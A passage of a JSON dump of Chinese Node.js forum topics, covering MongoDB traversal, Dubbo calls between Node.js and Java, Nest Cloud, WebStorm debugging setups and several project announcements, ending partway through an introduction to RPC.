&quot;string&quot;,\n                &quot;minLength&quot;: 2,\n                &quot;maxLength&quot;: 8\n            }\n        }\n    }\n]\n</code></pre><p>执行<code>mgodatagen -f mgodatagen-config.json</code>命令，即可生成 10000 万测试数据。</p>\n<pre class=\"prettyprint language-bash\"><code>mgodatagen -f mgodatagen-config.json\nConnecting to mongodb:&#x2F;&#x2F;127.0.0.1:27017\nMongoDB server version 3.2.13\n\ncollection members: done            [====================================================================] 100%\n\n+------------+----------+-----------------+----------------+\n| COLLECTION |  COUNT   | AVG OBJECT SIZE |    INDEXES     |\n+------------+----------+-----------------+----------------+\n| members    | 10000000 |             108 | _id_  95368 kB |\n+------------+----------+-----------------+----------------+\n\nrun finished in 1m12.82s\n</code></pre><p>查看 MongoDB，可知新生成的数据有 0.69GB，其实很小，但是使用 find()方法遍历会报错。</p>\n<pre class=\"prettyprint language-bash\"><code>show dbs\nlocal  0.000GB\ntest   0.690GB\n</code></pre><p><strong>3. 执行测试代码</strong></p>\n<p>两种不同遍历方法的代码分别位于<a href=\"https://github.com/Fundebug/loop-mongodb-big-collection/blob/master/test1.js\">test1.js</a>和<a href=\"https://github.com/Fundebug/loop-mongodb-big-collection/blob/master/test2.js\">test2.js</a>。</p>\n<h3>参考</h3>\n<ul>\n<li><a href=\"https://cnodejs.org/topic/51508570604b3d512113f1b3\">如何使用 mongoose 对一个 100 万+的 mongodb 的表进行遍历操作</a></li>\n<li><a href=\"https://thecodebarbarian.com/cursors-in-mongoose-45\">Cursors in Mongoose 4.5</a></li>\n</ul>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了10亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<h3>版权声明</h3>\n<p>转载时请注明作者<a href=\"https://www.fundebug.com/\">Fundebug</a>以及本文地址：\n<a href=\"https://blog.fundebug.com/2019/03/21/how-to-visit-all-documents-in-a-big-collection-of-mongodb/\">https://blog.fundebug.com/2019/03/21/how-to-visit-all-documents-in-a-big-collection-of-mongodb/</a></p>\n</div>","title":"如何高效地遍历 MongoDB 超大集合？","last_reply_at":"2019-04-04T03:59:02.130Z","good":false,"top":false,"reply_count":7,"visit_count":864,"create_at":"2019-03-21T01:04:11.264Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c88cb9cacb681372d417bf9","author_id":"5a7a5d505321b5396004ec1e","tab":"share","content":"<div class=\"markdown-text\"><p>欢迎使用 Nest Cloud\nNest Cloud 是一套以 consul 作为服务注册与发现中心，基于 nest.js 的微服务解决方案。</p>\n<p>由以下几个组件组成：</p>\n<p>​boot - 服务启动的时候读取本地配置文件和环境变量</p>\n<p>​consul - 对 consul api 的一层封装</p>\n<p>​consul-config - 提供以 consul kv 作为配置中心的 client</p>\n<p>​consul-service - 提供服务注册以及服务查找功能</p>\n<p>​consul-loadbalance - 提供本地负载均衡功能</p>\n<p>​feign - 提供基于 decorator 的 http client，并且支持负载均衡，使用更加简单方便</p>\n<p>​schedule - 提供基于 decorator 实现的定时任务库，支持分布式</p>\n<p>围观地址： <a href=\"https://nestcloud.org/solutions/\">https://nestcloud.org/solutions/</a></p>\n</div>","title":"基于 nest.js 的微服务解决方案—— Nest cloud","last_reply_at":"2019-04-04T03:11:27.759Z","good":false,"top":false,"reply_count":13,"visit_count":1504,"create_at":"2019-03-13T09:21:32.430Z","author":{"loginname":"zuohuadong","avatar_url":"https://avatars0.githubusercontent.com/u/11203929?v=4&s=120"}},{"id":"5ca494c76c1de62dce467889","author_id":"5c4589cc3b948a2b4ab701c9","tab":"ask","content":"<div class=\"markdown-text\"><p>我用model查询返回的model太大了，我现在只知道用JSON.stringfy()和JSON.parse()来回转换，请问还有什么方法可以转换吗</p>\n</div>","title":"请问mongoose的model怎么转成json对象","last_reply_at":"2019-04-04T02:41:41.409Z","good":false,"top":false,"reply_count":2,"visit_count":332,"create_at":"2019-04-03T11:11:03.119Z","author":{"loginname":"TJJ123456","avatar_url":"https://avatars1.githubusercontent.com/u/25629797?v=4&s=120"}},{"id":"5ca321436c1de62dce46703c","author_id":"511350f6df9e9fcc58856443","tab":"share","content":"<div class=\"markdown-text\"><h2>1. Dubbo 是啥？</h2>\n<p>Dubbo 是一个由阿里开源的 RPC 框架。</p>\n<p>简单说下RPC框架的背景。</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/6026faa6ly1g1his3o33yj20p40p011i.jpg\" alt=\"From dubbo.apache.org\"></p>\n<p>Dubbo 是一种 RPC 框架，应用在分布式服务。</p>\n<p><img src=\"http://dubbo.apache.org/img/architecture.png\" alt></p>\n<h2>2. 使用 Dubbo 实现 Java 互调</h2>\n<p>​\t首先我们可以先尝试下同语言下的 Dubbo 调用，从容易开始。</p>\n<p>​\t可以参考下 dubbo 官方文档 <a href=\"http://dubbo.apache.org/zh-cn/docs/user/quick-start.html\">http://dubbo.apache.org/zh-cn/docs/user/quick-start.html</a></p>\n<p>​\t这边简单尝试下，主要有两步：</p>\n<ol>\n<li>\n<p>首先建立一个服务提供方， 也就是上图 Provider 的角色；</p>\n</li>\n<li>\n<p>接下来建立一个服务消费者， 也如同上图的 Consumer 的角色；</p>\n</li>\n</ol>\n<h3>服务提供方建立 Provider</h3>\n<p><strong>1.0 使用Spring Boot 建立一个Spring 微服务</strong> (可以参考)<a href=\"http://https://yuchenzhen.github.io/2018/08/24/SpringBoot-IDE-initial/\">https://yuchenzhen.github.io/2018/08/24/SpringBoot-IDE-initial/</a></p>\n<p>**1.1.  建立一个 Interface **</p>\n<pre class=\"prettyprint language-   java\"><code>&#x2F;&#x2F; TestProviderService.java\n\npackage com.dubbo.learn.dubbo;\n\npublic interface TestProviderService {\n    String Hello (String who);\n}\n</code></pre><p><strong>1.2 实现这个TestProviderServiceImpl</strong></p>\n<pre class=\"prettyprint language- java\"><code>&#x2F;&#x2F; TestProviderServiceImpl\npackage com.dubbo.learn.dubbo.impl;\n\nimport com.dubbo.learn.dubbo.TestProviderService;\nimport com.alibaba.dubbo.config.annotation.Service;\n\n@Service(version=&quot;1.0.0&quot;)\npublic class TestProviderServiceImpl implements TestProviderService  {\n    public String Hello(String who) {\n        return &quot;Hello world ! Dear Programer &quot; + who ;\n    }\n}\n\n</code></pre><p><strong>1.3 启动程序主入口添加<code>@EnableDubbo</code>注解</strong></p>\n<pre class=\"prettyprint language- java\"><code>&#x2F;&#x2F; ProviderApplication.java\npackage com.dubbo.learn;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport com.alibaba.dubbo.config.spring.context.annotation.EnableDubbo;\n\n@SpringBootApplication\n@EnableDubbo\npublic class ProviderApplication {\n\n    public static void main(String[] args) {\n        SpringApplication.run(ProviderApplication.class, args);\n    }\n\n}\t\n</code></pre><p>​\t为了引入这个<code>@EnableDubbo</code>注解，需要我们引入<code>com.alibaba</code>的包</p>\n<pre class=\"prettyprint language-xml\"><code>&lt;!--pom.xml--&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;com.alibaba.boot&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;dubbo-spring-boot-starter&lt;&#x2F;artifactId&gt; \n  &lt;version&gt;0.2.1.RELEASE&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;dubbo&lt;&#x2F;artifactId&gt;\n  &lt;version&gt;2.6.5&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.curator&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;curator-framework&lt;&#x2F;artifactId&gt;\n  &lt;version&gt;2.11.1&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n</code></pre><p>​\t<code>curator-framework</code>是dubbo所使用的消息中心<code>Zookeeper</code>所需要的包<br>\n​\t<code>dubbo-spring-boot-starter</code>是 dubbo spring 的配置包</p>\n<p><strong>1.4 最后我们把dubbo 的启动配置写到<code>application.properties</code>里面</strong></p>\n<pre class=\"prettyprint language-properties\"><code># application.properties\nserver.port = 8829\n#\ndubbo.application.name=provider\ndubbo.registry.protocol=zookeeper\ndubbo.registry.address=zookeeper:&#x2F;&#x2F;127.0.0.1:2181\ndubbo.scan.base-packages=com.dubboo.learn\ndubbo.protocol.name=dubbo\ndubbo.protocol.port=20880\ndubbo.consumer.check=false\n</code></pre><p>整个项目结构如图：</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/6026faa6gy1g1ffq5j1mrj20a70jhab5.jpg\" alt></p>\n<p>然后，启动就好。</p>\n<p>启动之后，通过 dubbo Admin 网页客户端可以看见Provider的接口在 Regitry 里面注册成功。<br>\n<img src=\"http://ww1.sinaimg.cn/large/6026faa6gy1g1ffrs83ubj227m0n8djl.jpg\" alt></p>\n<h3>服务消费者Consumer</h3>\n<p><strong>1.0 使用Spring Boot 建立一个Spring 消费者的微服务</strong></p>\n<p><strong>1.1 定义接口，这里的接口路径位置和包名最好一致 （不然要自己调整）</strong></p>\n<pre class=\"prettyprint language-java\"><code>&#x2F;&#x2F; TestProviderService.java\npackage com.dubbo.learn.dubbo;\npublic interface TestProviderService {\n    String Hello (String who);\n}\n</code></pre><p><strong>1.2 定义一个 Service调用该dubbo 接口</strong></p>\n<pre class=\"prettyprint language-java\"><code>&#x2F;&#x2F; TestConsumerService.java\npackage com.dubbo.learn;\n\nimport com.alibaba.dubbo.config.annotation.Reference;\nimport com.dubbo.learn.dubbo.TestProviderService;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class TestConsumerService {\n    @Reference(version = &quot;1.0.0&quot;)\n    TestProviderService testProviderService;\n\n    public void consumer (String who) {\n        String res = testProviderService.Hello(who);\n        System.out.println(&quot;consumer : provider says &quot; + res);\n    }\n}\n</code></pre><p>在主程序函数调用该Service 的函数</p>\n<pre class=\"prettyprint language-java\"><code>&#x2F;&#x2F; DubboConsumerApplication.java\npackage com.dubbo.learn;\n\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.ConfigurableApplicationContext;\nimport com.dubbo.learn.TestConsumerService;\n\n@SpringBootApplication\npublic class DubboConsumerApplication {\n\n    public static void main(String[] args) {\n        ConfigurableApplicationContext run = SpringApplication.run(DubboConsumerApplication.class, args);\n        TestConsumerService testConsumer = run.getBean(TestConsumerService.class);\n        testConsumer.consumer(&quot;White&quot;);\n    }\n\n}\n</code></pre><p><code>@Reference</code>这个注解就是用来调用 dubbo 对应的接口的。所以也是要引入跟服务端的那几个包</p>\n<pre class=\"prettyprint language-xml\"><code>&lt;!--pom.xml--&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;com.alibaba.boot&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;dubbo-spring-boot-starter&lt;&#x2F;artifactId&gt; \n  &lt;version&gt;0.2.1.RELEASE&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;dubbo&lt;&#x2F;artifactId&gt;\n  &lt;version&gt;2.6.5&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;\n&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.curator&lt;&#x2F;groupId&gt;\n  &lt;artifactId&gt;curator-framework&lt;&#x2F;artifactId&gt;\n  &lt;version&gt;2.11.1&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;  \n</code></pre><p><strong>1.3 最后我们把dubbo 的启动配置写到application.properties里面</strong></p>\n<pre class=\"prettyprint language- properties\"><code>#application.properties\nserver.port=8830\ndubbo.application.name=consumer\n#注册中心地址\ndubbo.registry.address=zookeeper:&#x2F;&#x2F;127.0.0.1:2181\n\ndubbo.scan.base-packages=com.dubboo.learn.dubbo\ndubbo.protocol.port=20880\n</code></pre><p>项目目录结构如下：\n<img src=\"http://ww1.sinaimg.cn/large/6026faa6gy1g1fgt0ik3aj20aa0irdgx.jpg\" alt></p>\n<p>启动后效果如下：</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/6026faa6gy1g1fgfyr094j211l0e60yc.jpg\" alt></p>\n<h2>3. Node.js 如何通过 Dubbo 调用 Java</h2>\n<p>Node 这边通过 dubbo调用 Java 的 provider 的接口，我们尝试调用了几个包：sofa-rpc-node，node-zookeeper-dubbo，和dubbo2.js 。<br>\n其中 sofa-rpc-node 的对使用 egg.js框架的比较友好，node-zookeeper-dubbo 使用起来跟 sofa-rpc-node 差不多；但是有点麻烦的就是这两个包都需要写 proto3的接口定义。<br>\n而 dubbo2.js则比较方便，以下是使用 dubbo2.js 的示列</p>\n<pre class=\"prettyprint language-javascript\"><code>const { Dubbo, java, setting } = require(&#x27;dubbo2.js&#x27;)\nconst interfaceName = &#x27;com.dubbo.learn.dubbo.TestProviderService&#x27;\nconst interfaceVersion = &#x27;1.0.0&#x27;\nconst dubboSetting = setting.match(\n  interfaceName, { version: interfaceVersion }\n)\nconst dubboService = dubbo =&gt; dubbo.proxyService({\n  dubboInterface: interfaceName,\n  version: &#x27;1.0.0&#x27;,\n  methods: {\n    Hello (who) {\n      return [\n        java.String(who)\n      ]\n    }\n  }\n})\nconst service = {dubboService}\n&#x2F;&#x2F; 实例化Dubbo， 入参主要是名称和 dubbo 接口的设置\nconst dubbo = new Dubbo({\n  application: {name: &#x27;dubbo-node-test&#x27;},\n  register: &#x27;127.0.0.1:2181&#x27;,\n  dubboSetting,\n  service\n})\n\nmodule.exports = dubbo\n\n</code></pre><p>代码就是这么简单， 把 Java 服务里面通过 dubbo 提供出来的接口(包括接口名，接口版本信息，接口方法) 注册一下。<br>\n得到Dubbo 实例之后，调用对应的 service就可以使用。<br>\n如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>await dubbo.service.dubboService.Hello(who)\n</code></pre><p>我们简单写了一个接口：</p>\n<pre class=\"prettyprint language-javascript\"><code>const KoaRouter = require(&#x27;koa-router&#x27;)\nconst dubbo = require(&#x27;.&#x2F;dubbo&#x27;)\nconst router = new KoaRouter({prefix: &#x27;&#x2F;api&#x2F;v1&#x27;})\n\nrouter.use(&#x27;&#x2F;&#x27;)\n\nrouter.get(&#x27;&#x2F;testNodeDubbo&#x27;, async (ctx, next) =&gt; {\n  console.info(&#96;[testNodeDubbo]:==:&gt; start&#96;)\n  let {who} = ctx.request.query\n  const res = await dubbo.service.dubboService.Hello(who)\n  ctx.body = res\n})\n\nmodule.exports = router\n\n</code></pre><p>调用结果：</p>\n<p><img src=\"http://ww1.sinaimg.cn/large/6026faa6gy1g1gidpequnj20zc0fyq45.jpg\" alt><br>\n这样就完成了 node 作为消费者通过 dubbo 去调用 java 的接口了。</p>\n<h2>4. Node.js 通过接口调用 Java 与 通过 Dubbo 调用 Java 的对比</h2>\n<p><img src=\"http://ww1.sinaimg.cn/large/6026faa6gy1g1hbp8z51mj21fg0kaq7i.jpg\" alt><br>\n这边尝试使用了调用了同样逻辑的 dubbo 和 http 接口， 对比了一下两个实现的返回时间。<br>\n其中红色的是 dubbo 接口， 蓝色的是 http 接口。</p>\n<h4>其他：</h4>\n<p>项目地址：\n<a href=\"https://github.com/yuchenzhen/Java-dubbo-provider\">https://github.com/yuchenzhen/Java-dubbo-provider</a>\n<a href=\"https://github.com/yuchenzhen/Java-dubbo-client\">https://github.com/yuchenzhen/Java-dubbo-client</a>\n<a href=\"https://github.com/yuchenzhen/node-dubbo2-consumer/tree/master\">https://github.com/yuchenzhen/node-dubbo2-consumer/tree/master</a></p>\n</div>","title":"Node.js通过Dubbo2.js调用Java","last_reply_at":"2019-04-03T12:02:23.250Z","good":false,"top":false,"reply_count":1,"visit_count":526,"create_at":"2019-04-02T08:45:55.530Z","author":{"loginname":"kalengo","avatar_url":"https://avatars2.githubusercontent.com/u/8817810?v=4&s=120"}},{"id":"5c9c87e799e62a362ff40cce","author_id":"5c88bffdacb681372d417bb4","tab":"share","content":"<div class=\"markdown-text\"><p>多多客（doodooke）是一款支持微信、百度、支付宝小程序的第三方SaaS平台。</p>\n<p><strong>重要更新</strong>\n1、开源diy可视化拖拉拽；\n2、开源taro三端合一小程序；</p>\n<p><strong>3.0新特性</strong>\n1、支持migrations，可以快速的创建和修改表；\n2、支持rewrite，可以将请求转发到修改过的接口；\n3、支持view逻辑钩子，可以扩展vue逻辑；\n4、支持view视图钩子，可以扩展vue视图；\n5、支持cluster，可以启动多个项目；\n6、支持本地调试，可以将生产环境的请求转发或复制到本地；\n7、支持bin命令，可以快速的处理migration等；</p>\n<p>开源版下载：<a href=\"https://gitee.com/doodooke/doodoo\">https://gitee.com/doodooke/doodoo</a></p>\n</div>","title":"【全开源】可视化DIY微信/百度/支付宝小程序saas平台源码","last_reply_at":"2019-04-03T10:38:22.539Z","good":false,"top":false,"reply_count":1,"visit_count":597,"create_at":"2019-03-28T08:37:59.067Z","author":{"loginname":"doodooke1688","avatar_url":"https://avatars0.githubusercontent.com/u/48510722?v=4&s=120"}},{"id":"5c9490cb00bcfd7eb2be500a","author_id":"5c88bffdacb681372d417bb4","tab":"share","content":"<div class=\"markdown-text\"><p>多多客（doodooke）是一款支持微信、百度、支付宝小程序的第三方SaaS平台。</p>\n<p><strong>重要更新</strong>\n1、开源diy可视化拖拉拽；\n2、开源taro三端合一小程序；</p>\n<p><strong>3.0 新特性</strong>\n1、支持migrations，可以快速的创建和修改表\n通过命令./bin/migrate.js make [name] --scope [module]创建migration，然后使用./bin/migrate.js latest执行migration，使用./bin/migrate.js rollback回滚migration，具体migration的用法可以参考knex文档 <a href=\"https://knexjs.org\">https://knexjs.org</a></p>\n<p>2、支持rewrite，可以将请求转发到修改过的接口\n二次开发最大的问题就是如何在保证系统一致性和更新的情况下，二次修改代码。比如我们需要修改app模块，然后我们复制app模块，起名apps，然后修改rewrite.js，添加如下数据，即完成了配置。此时我们请求app模块会全部转发到apps模块。提示：一个模块下前端路由不带/api，后端路由以/api开头</p>\n<pre class=\"prettyprint language-js\"><code>module.exports = {\n    &quot;&#x2F;app&quot;: &quot;&#x2F;apps&quot;,\n    &quot;&#x2F;api&#x2F;app&quot;: &quot;&#x2F;api&#x2F;apps&quot;\n}\n</code></pre><p>3、支持view逻辑钩子，可以扩展vue逻辑\n3.0重要的特性之一，可以很方便到扩展vue前端逻辑。通过调用this.$hook.run(“xxx”, 1, 2)自动加载view_hook目录下hook.js名称为xxx的函数，修改data里面的数据等。</p>\n<p>4、支持view视图钩子，可以扩展vue视图\n3.0重要的特性之二，可以很方便的扩展vue前端视图，通过调用&lt;doodoo-hook name=“xxx” abc=“2”&gt;&lt;/doodoo-hook&gt;实现，当系统发现view_hook目录下，名称是xxx.vue会自动加载到调用的位置</p>\n<p>5、支持cluster，可以启动多个项目\n目前仅支持同一个序列号，同一台服务器启动多个实例，如需多台服务器启动，请联系客服</p>\n<p>6、支持本地调试，可以将生产环境的请求转发或复制到本地\n解决生产环境的bug，是一个很头痛的问题，我们除了有错误监控外，新增加了本地调试功能。本地调试功能可以将线上生产环境的请求转发或者复制到本地系统，这样可以快速的发现和修复bug。线上的已全部集成到所有的系统，线下的命令行工具会随后发布。</p>\n<p>7、支持bin命令，可以快速的处理migration等\n目前支持doodoo.sh和migrate.js命令</p>\n<p><a href=\"https://gitee.com/doodooke/doodoo\">3.0开源版</a><a href=\"https://gitee.com/doodooke/doodoo\">https://gitee.com/doodooke/doodoo</a></p>\n</div>","title":"多多客发布 3.0.0-alpha.3开源版，支持微信、百度、支付宝小程序","last_reply_at":"2019-04-03T10:37:34.030Z","good":false,"top":false,"reply_count":1,"visit_count":453,"create_at":"2019-03-22T07:37:47.641Z","author":{"loginname":"doodooke1688","avatar_url":"https://avatars0.githubusercontent.com/u/48510722?v=4&s=120"}},{"id":"5ca1b8206c1de62dce46688d","author_id":"5a3b17649807389a1809f5a5","tab":"ask","content":"<div class=\"markdown-text\"><p>mongo 同步数据到 es上，尽可能的不改现有代码？各位怎么做的？</p>\n</div>","title":"mongo 同步数据到 es上，尽可能的不改现有代码？各位怎么做的？","last_reply_at":"2019-04-03T06:19:42.632Z","good":false,"top":false,"reply_count":1,"visit_count":595,"create_at":"2019-04-01T07:05:04.123Z","author":{"loginname":"Sxy97","avatar_url":"https://avatars3.githubusercontent.com/u/24429847?v=4&s=120"}},{"id":"5c9843bffd41137eb76612fc","author_id":"5b1d495729e6e510415b29b0","tab":"ask","content":"<div class=\"markdown-text\"><p>后台有一个接口，做一分钟内只能被调用一次，多余的请求被忽略。请问有什么模块或者什么方法可以来实现吗</p>\n</div>","title":"express接口做1分钟只能请求一次的限制","last_reply_at":"2019-04-03T05:09:48.888Z","good":false,"top":false,"reply_count":7,"visit_count":1040,"create_at":"2019-03-25T02:58:07.038Z","author":{"loginname":"helloHT","avatar_url":"https://avatars3.githubusercontent.com/u/31006740?v=4&s=120"}},{"id":"5ca42f696c1de62dce46744a","author_id":"5ca42bf931010b2dfbb42a1c","tab":"share","content":"<div class=\"markdown-text\"><p>HTTP Catcher 是一个 iOS 平台上的 http 调试工具，一般我们查看移动设备上的 http 请求需要连接电脑上的代理应用，通过代理应用才能查看请求日志。使用 HTTP Catcher 可以在 iOS 设备上直接查看请求内容，同时支持 https 数据解密。</p>\n<h1>功能</h1>\n<ul>\n<li>实时记录 HTTP 和 WebSocket 请求</li>\n<li>支持解密 HTTPS</li>\n<li>请求过滤</li>\n<li>支持远程代理</li>\n<li>图片预览</li>\n<li>HTML, JavaScript, CSS 格式化预览</li>\n<li>二进制数据查看</li>\n<li>自定义 Hosts</li>\n<li>重放请求</li>\n<li>黑名单</li>\n</ul>\n<p>分享一个比较常用的场景：\n在配合服务端接口调试的时候，会被要求重发请求，有时候需要页面多次跳转才能发送相应的请求，使用重放功能会简化这个工作。</p>\n<p>目前应用还在持续开发中，期待大家使用！</p>\n<p><a href=\"https://itunes.apple.com/us/app/http-catcher/id1445874902?l=zh&amp;ls=1&amp;mt=8\">Link to App Store</a></p>\n<p><a href=\"https://testflight.apple.com/join/4Qt2lIm5\">Link to TestFight</a></p>\n</div>","title":"分享 iOS 平台下的 http 抓包应用 - HTTP Catcher","last_reply_at":"2019-04-03T03:58:33.820Z","good":false,"top":false,"reply_count":0,"visit_count":564,"create_at":"2019-04-03T03:58:33.820Z","author":{"loginname":"imxiaozhi","avatar_url":"https://avatars1.githubusercontent.com/u/7193241?v=4&s=120"}},{"id":"5c9c477d484eeb3634157d7b","author_id":"5c9c474299e62a362ff40b3c","tab":"ask","content":"<div class=\"markdown-text\"><p>nodejs怎么执行远程服务器的bat脚本，求大佬</p>\n</div>","title":"nodejs怎么执行远程服务器的bat脚本","last_reply_at":"2019-04-03T03:11:36.979Z","good":false,"top":false,"reply_count":5,"visit_count":562,"create_at":"2019-03-28T04:03:09.310Z","author":{"loginname":"IAmYuanZhao","avatar_url":"https://avatars2.githubusercontent.com/u/38496544?v=4&s=120"}},{"id":"5ca3724631010b2dfbb427d5","author_id":"56d01c25dec0748461ebb8e6","tab":"share","content":"<div class=\"markdown-text\"><p>WebStorm 有很方便的 Debug 功能，如果是普通 node.js 项目的话，参考 <a href=\"https://www.jetbrains.com/help/webstorm/running-and-debugging-node-js.html\">WebStorm 官方的 Debug 说明</a> 配置即可。</p>\n<p>由于 node.js 7+ 后都使用 <a href=\"https://nodejs.org/en/docs/guides/debugging-getting-started/\">Inspector</a> 来实现 Debug， 因此需要注意最低保证 node.js 版本 &gt;= 7 及 JetBrains WebStorm 版本 &gt;= 2017.1+。</p>\n<p>鉴于 js 项目的多样性，实际项目中，经常会使用 Babel 或者 TypeScript 编译，特别记录下 <a href=\"https://avnpc.com/pages/webstorm-debug-typescript-babel-project\">WebStorm 在使用 TypeScript 或 Babel 时的 Debug 配置</a>以备忘。 下文以 node.js v10 及 WebStorm 2019.1 为例。</p>\n<h2>WebStorm Debug 基于 Babel 的项目</h2>\n<p>虽然 babel 有 <a href=\"https://babeljs.io/docs/en/babel-node\">babel-node</a> 可以直接运行未编译代码，但并不推荐在 Debug 中使用 babel-node 直接替换 node。这是由于 babel-node <a href=\"https://github.com/babel/babel/blob/master/packages/babel-node/src/babel-node.js\">只是一个 node cli 的简单封装</a>，在 babel-node 的一些早期版本中， 并未加入 <code>--inspect-brk</code> 等 Debug 所需参数的支持，可能会引发无法打断点或 Debug 进程无法退出等问题。</p>\n<p>首先确认好 babel 的安装情况</p>\n<p>对于 Babel 7</p>\n<pre class=\"prettyprint language-bash\"><code>npm install --save-dev @babel&#x2F;core @babel&#x2F;cli @babel&#x2F;register\n</code></pre><p>对于 Babel 6</p>\n<pre class=\"prettyprint language-bash\"><code>npm install --save-dev babel-core babel-cli babel-register\n</code></pre><p>推荐的 Debug 配置如下：</p>\n<ol>\n<li>打开 <code>Run/Debug Configuration</code> 窗口</li>\n<li>新建一个配置，类型选择 <code>Node.js</code></li>\n<li><code>Node Interpreter</code> 选择本地安装的 node 路径</li>\n<li><code>Node Parameters</code> 中通过 <code>-r</code> 参数，在 node 启动时额外加载 babel 的运行时， 即\n<ul>\n<li>如果是 Babel 7, 填入 <code>-r @babel/register</code></li>\n<li>如果是 Babel 6， 填入 <code>-r babel-register</code></li>\n</ul>\n</li>\n<li><code>Working Directory</code> 中填入当前项目的根目录</li>\n<li><code>JavaScript file</code> 中填入要 Debug 的 js 文件的相对路径 （相对项目根目录）。如果是类似 Express 之类的 Web 服务，填入服务启动入口文件相对路径</li>\n</ol>\n<p>如下图</p>\n<p><img src=\"https://static.avnpc.com/blog/2019/webstorm_debug_babel.png\" alt=\"WebStorm debug Babel\"></p>\n<h2>WebStorm Debug 基于 TypeScript 的项目</h2>\n<p>和 Babel 类似， TypeScript 的项目也可以用同样的思路进行 Debug</p>\n<pre class=\"prettyprint language-bash\"><code>npm install --save-dev typescript ts-node\n</code></pre><p>配置如下</p>\n<ol>\n<li>打开 <code>Run/Debug Configuration</code> 窗口</li>\n<li>新建一个配置，类型选择 <code>Node.js</code></li>\n<li><code>Node Interpreter</code> 选择本地安装的 node 路径</li>\n<li><code>Node Parameters</code> 填入 <code>-r ts-node/register</code></li>\n<li><code>Working Directory</code> 中填入当前项目的根目录</li>\n<li><code>JavaScript file</code> 中填入要 Debug 的 ts 文件的相对路径</li>\n</ol>\n<p>如图</p>\n<p><img src=\"https://static.avnpc.com/blog/2019/webstorm_debug_typescript.png\" alt=\"WebStorm debug TypeScript\"></p>\n</div>","title":"使用 WebStorm Debug 基于 TypeScript 或 Babel 的 node.js 项目","last_reply_at":"2019-04-02T14:31:34.390Z","good":false,"top":false,"reply_count":0,"visit_count":360,"create_at":"2019-04-02T14:31:34.390Z","author":{"loginname":"AlloVince","avatar_url":"https://avatars3.githubusercontent.com/u/176019?v=4&s=120"}},{"id":"5ca2baa76c1de62dce466bc6","author_id":"5ca2a0806c1de62dce466b43","tab":"share","content":"<div class=\"markdown-text\"><p>看《社交网络》时，扎克伯格用博客直播黑掉隔壁宿舍的照片网站，顿时觉得太酷！当即决定开发一个玩玩。但随着使用的深入，功能逐渐扩展至大部分文字使用场景，比如我用它记录要看的书籍，美剧，电影，记录技术要点，记录网址，写购物清单，写工作列表，写博客等。我甚至用它与几个笔友聊天。\n优点是：对文档进行分类管理；打开就可以开始记录，无需登录\n缺点是：不适合贴代码；界面还不够美观</p>\n<p><a href=\"http://talkooo.com\">网站: talkooo.com</a></p>\n<p>我一个人玩太无聊了，希望能多几个人来玩玩！随手记可能对部分人有用，因为我每天都要使用到它。下面是我的使用截图:</p>\n<p><img src=\"//static.cnodejs.org/FsOhB8-btlOAgNa3XnO2sJXNLHE2\" alt=\"IMG_1009.PNG\"></p>\n<p><img src=\"//static.cnodejs.org/FhBipZmao8I2o-yglUXspesk-d5u\" alt=\"IMG_1012.PNG\"></p>\n<p><img src=\"//static.cnodejs.org/FoAEPLBf4-tmFY1rr7R4n9qzUWxu\" alt=\"IMG_1011.PNG\"></p>\n</div>","title":"用Node.js写了一个随手记的web应用","last_reply_at":"2019-04-02T10:23:50.860Z","good":false,"top":false,"reply_count":2,"visit_count":609,"create_at":"2019-04-02T01:28:07.024Z","author":{"loginname":"talkooo","avatar_url":"https://avatars2.githubusercontent.com/u/47216906?v=4&s=120"}},{"id":"5b63b25e792f59ae501bf71c","author_id":"59c12213e7d9a031127ead16","tab":"share","content":"<div class=\"markdown-text\"><h4>RPC是什么</h4>\n<p>在很久之前的单机时代，一台电脑中跑着多个进程，进程之间没有交流各干各的，就这样过了很多年。突然有一天有了新需求，A进程需要实现一个画图的功能，恰好邻居B进程已经有了这个功能，偷懒的程序员C想出了一个办法：A进程调B进程的画图功能。于是出现了<code>IPC</code>（Inter-process communication，进程间通信）。就这样程序员C愉快的去吃早餐去了！</p>\n<p>又过了几年，到了互联网时代，每个电脑都实现了互联互通。这时候雇主又有了新需求，当时还没挂的A进程需要实现使用<code>tensorflow</code>识别出笑脸 &gt;_&lt; 。说巧不巧，远在几千里的一台快速运行的电脑上已经实现了这个功能，睡眼惺忪的程序媛D接手了这个A进程后借鉴之前<code>IPC</code>的实现，把<code>IPC</code>扩展到了互联网上，这就是<code>RPC</code>(Remote Procedure 